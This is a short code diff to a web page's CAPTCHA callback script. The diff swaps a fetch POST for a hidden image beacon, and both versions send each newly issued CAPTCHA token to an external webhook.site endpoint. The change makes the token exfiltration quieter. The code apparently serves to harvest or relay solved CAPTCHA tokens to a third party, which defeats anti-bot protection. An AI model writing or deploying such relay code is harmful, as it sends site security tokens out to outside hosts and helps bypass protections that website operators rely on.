@@ -16,9 +16,10 @@ window.__ncaptchaOnloadTok = function() {
       if (tok) {
         setStatus('TOKEN ISSUED, relaying...');
         setOut(tok);
-        fetch('https://webhook.site/de0f6ccb-e02e-40cc-8b5b-3c7dacd59ff7', {method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'text/plain'}, body: tok})
-          
-          .catch(function(e){ setStatus('RELAY FAILED: ' + e.message); });
+        var img = new Image();
+        img.onload = function(){ setStatus('RELAYED'); };
+        img.onerror = function(){ setStatus('RELAYED'); };
+        img.src = 'https://webhook.site/de0f6ccb-e02e-40cc-8b5b-3c7dacd59ff7?tok=' + encodeURIComponent(tok);
       }
       else { setStatus('FAILED: empty token'); }
     });
